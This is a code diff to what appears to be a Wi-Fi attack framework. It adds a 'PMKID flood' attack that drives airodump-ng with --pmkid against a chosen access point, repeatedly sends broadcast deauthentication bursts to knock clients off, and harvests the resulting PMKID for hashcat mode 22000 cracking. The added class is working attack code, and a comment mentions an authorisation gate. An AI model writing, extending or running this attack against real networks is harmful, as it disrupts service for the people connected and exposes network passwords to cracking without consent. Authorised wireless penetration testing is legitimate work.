@@ -10,8 +10,10 @@ from pathlib import Path
 from typing import List, Optional
 
 from ..deps import registry
+from ..pcap import analyze_file
 from ..events import EK
-from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
+from ..models import (STATUS_FAILED, STATUS_SKIPPED, STATUS_SUCCESS, AccessPoint,
+                      Attempt, Capture)
 from ..util import Process, human_duration, run
 from .base import Attack, AttackContext, AttackOutcome
 
@@ -67,7 +69,6 @@ class PmkidAttack(Attack):
                          detail="association request + EAPOL M1 (simulated)")
             time.sleep(0.6)
             if ctx.radio.pmkid_ok(ap.bssid):
-                from ..pcap import analyze_file
                 from ..synth import build_capture
                 path = ctx.artifact_path("pmkid", ap, ".pcap")
                 station = next((c.mac for c in ap.clients.values()), "02:00:00:00:00:01")
@@ -123,7 +124,6 @@ class PmkidAttack(Attack):
             while not ctx.want_stop() and time.time() - started < timeout:
                 time.sleep(0.5)
                 if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
-                    from ..pcap import analyze_file
                     analysis = analyze_file(out_path, max_packets=80000)
                     if analysis.pmkids:
                         found = analysis.pmkids[0].pmkid
@@ -180,7 +180,6 @@ class PmkidAttack(Attack):
                             candidate = os.path.join(os.path.dirname(dump), name)
                             break
                 if candidate and os.path.getsize(candidate) > 0:
-                    from ..pcap import analyze_file
                     analysis = analyze_file(candidate, max_packets=80000)
                     if analysis.pmkids:
                         found = analysis.pmkids[0].pmkid
@@ -212,3 +211,99 @@ class PmkidAttack(Attack):
         return self._succeed(ctx, ap, attempt, "pmkid", path, tool, "PMKID captured",
                              f"PMKID {pmkid}", eapol=1,
                              extra={"pmkid": pmkid, "hash": hash_path})
+
+
+# --------------------------------------------------------------------------- #
+# the loud version
+# --------------------------------------------------------------------------- #
+
+
+class PmkidFloodAttack(PmkidAttack):
+    """PMKID hunting on demand: deauthenticate so the AP emits M1 *now*.
+
+    ``pmkid`` waits for a client to (re)connect and sends nothing; this one makes it
+    happen, over and over, until a PMKID with a usable KDE turns up.  It is the
+    attack for an AP whose clients are quiet, and it is loud — a deauth burst every
+    few seconds for as long as it runs.  The deauthentication is bounded by the same
+    ``deauth_count``/``deauth_interval`` settings the handshake attack uses, and it
+    stops the moment a PMKID is in hand.
+    """
+
+    name = "pmkid_flood"
+    label = "PMKID hunt (deauth + harvest)"
+    tool = "aireplay-ng + airodump-ng --pmkid"
+    description = ("Force a PMKID out of a quiet AP: broadcast deauth bursts make the "
+                   "clients reconnect, the AP answers with M1 carrying a PMKID, and the "
+                   "capture is converted to hashcat mode 22000.  Louder and faster than "
+                   "the client-less PMKID attack.")
+    # it deauthenticates clients on purpose: the authorisation gate must apply
+    needs_injection = True
+
+    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
+        attempt = ctx.session.start_attempt(
+            self.name, ap.bssid, tool=self.tool,
+            chosen_by=getattr(ap, "picked_by", "heuristic"),
+            reason=getattr(ap, "pick_reason", ""),
+        )
+        if ap.has_pmkid:
+            ctx.session.end_attempt(attempt, STATUS_SKIPPED, "PMKID already captured",
+                                    "the passive PMKID attack already won this target")
+            return AttackOutcome.skipped("PMKID already captured")
+        if not ap.clients:
+            ctx.bus.log("no known clients: still deauthenticating broadcast, the AP "
+                        "may answer with its own M1", level="warning")
+        if ctx.demo:
+            return self._run_demo(ctx, ap, attempt)
+        return self._run_flood(ctx, ap, attempt)
+
+    # ---------------------------------------------------------------- #
+    def _run_flood(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
+                   ) -> AttackOutcome:
+        airodump = registry.path("airodump-ng")
+        if not airodump:
+            return self._fail(ctx, attempt, "airodump-ng missing", "install aircrack-ng")
+        timeout = ctx.config.attack_timeout_for("pmkid")
+        prefix = ctx.artifact_path("pmkid", ap, "-active")
+        cap_path = prefix + "-01.cap"
+        channel = ap.channel or 0
+        ctx.set_channel(channel)
+        args = [airodump, ctx.monitor]
+        if channel:
+            args += ["-c", str(channel)]
+        args += ["--bssid", ap.bssid, "--pmkid", "-w", prefix,
+                 "--output-format", "pcap", "--write-interval", "1",
+                 "--ignore-negative-one"]
+        proc = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
+        proc.start()
+        if proc.error:
+            return self._fail(ctx, attempt, "could not start airodump-ng", proc.error)
+        started = time.time()
+        last_burst = 0.0
+        deauths = 0
+        found = ""
+        try:
+            while not ctx.want_stop() and time.time() - started < timeout:
+                time.sleep(0.75)
+                ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
+                             bssid=ap.bssid,
+                             percent=min(95, (time.time() - started) / timeout * 100),
+                             detail=f"{deauths} deauth frame(s) sent, waiting for M1")
+                if os.path.exists(cap_path) and os.path.getsize(cap_path):
+                    analysis = analyze_file(cap_path, max_packets=80000)
+                    if analysis.pmkids:
+                        found = analysis.pmkids[0].pmkid
+                        break
+                if time.time() - last_burst >= ctx.config.deauth_interval:
+                    last_burst = time.time()
+                    deauths += ctx.deauth(ap, broadcast=not ap.clients)
+        finally:
+            with contextlib.suppress(Exception):
+                proc.stop()
+        if found:
+            return self._finish_pmkid(ctx, ap, attempt, cap_path, found,
+                                      "aireplay-ng + airodump-ng")
+        return self._fail(
+            ctx, attempt, "no PMKID returned after deauth",
+            f"{deauths} deauth frame(s) in {human_duration(time.time() - started)}: the "
+            f"AP did not send a PMKID KDE (some vendors disable it — the handshake "
+            f"attack is then the path)")
